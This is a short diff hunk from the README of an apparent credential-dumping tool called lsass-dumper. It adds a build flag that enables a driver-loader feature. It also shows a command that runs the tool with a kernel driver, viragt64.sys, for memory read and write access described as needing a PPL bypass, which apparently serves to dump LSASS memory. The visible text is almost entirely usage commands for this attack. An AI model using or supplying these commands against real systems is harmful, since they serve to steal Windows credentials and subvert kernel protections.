@@ -269,6 +269,8 @@ Output format:  [key_len: u32 LE] [key: N bytes] [encrypted_data]
 # Build
 cargo build --release
 
+cargo build --release --features driver-loader
+
 # Mode 1: viragt64 — virtual memory R/W (requires PPL bypass)
 lsass-dumper.exe -d viragt64.sys -s viragt64 -t viragt -m seclogon
 
